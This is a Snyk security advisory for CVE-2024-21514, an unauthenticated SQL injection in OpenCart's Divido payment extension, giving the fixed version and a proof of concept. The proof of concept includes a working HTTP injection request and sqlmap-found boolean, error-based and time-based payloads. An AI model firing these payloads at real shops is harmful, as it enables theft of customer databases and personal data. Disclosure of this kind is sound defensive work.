Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

#### Introduced: 21 Jun 2024

[CVE-2024-21514  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21514) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-89  (opens in a new tab)](https://cwe.mitre.org/data/definitions/89.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `opencart/opencart` to version 3.0.4.0 or higher.

## Overview

[opencart/opencart](https://packagist.org/packages/opencart/opencart) is a shopping cart system

Affected versions of this package are vulnerable to SQL Injection. An SQL Injection issue was identified in the Divido payment extension for OpenCart, which is included by default in version 3.0.3.9. As an anonymous unauthenticated user, if the Divido payment module is installed (it does not have to be enabled), it is possible to exploit SQL injection to gain unauthorised access to the backend database. For any site which is vulnerable, any unauthenticated user could exploit this to dump the entire OpenCart database, including customer PII data.

## PoC

This can be exploited with a POST request to `/index.php?route=extension/payment/divido/update` which will delay the response for 5 seconds.

```
POST http://localhost/index.php?route=extension/payment/divido/update HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5

Content-Type: application/json
content-length: 44

{"status":true,"metadata":{"order_id":"1 AND (SELECT 6684 FROM (SELECT(SLEEP(5)))mUHr)"}}

```

Using this request in SQLmap it identified three different payload types:

```
python3 sqlmap.py -vv -r /tmp/oc2.raw --level 3 --risk 2
...
Parameter: JSON #1* ((custom) POST)
  Type: boolean-based blind
  Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
  Payload: {"status":true,"metadata":{"order_id":"1 AND 7610=(SELECT (CASE WHEN (7610=7610) THEN 7610 ELSE (SELECT 7298 UNION SELECT 8143) END))-- -"}}
  Vector: AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))[GENERIC_SQL_COMMENT]

Type: error-based
  Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
  Payload: {"status":true,"metadata":{"order_id":"1 AND EXTRACTVALUE(2524,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(2524=2524,1))),0x71716b7071))"}}
  Vector: AND EXTRACTVALUE([RANDNUM],CONCAT('&#39;,'[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))

  Type: time-based blind
  Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  Payload: {"status":true,"metadata":{"order_id":"1 AND (SELECT 6684 FROM (SELECT(SLEEP(5)))mUHr)"}}
  Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
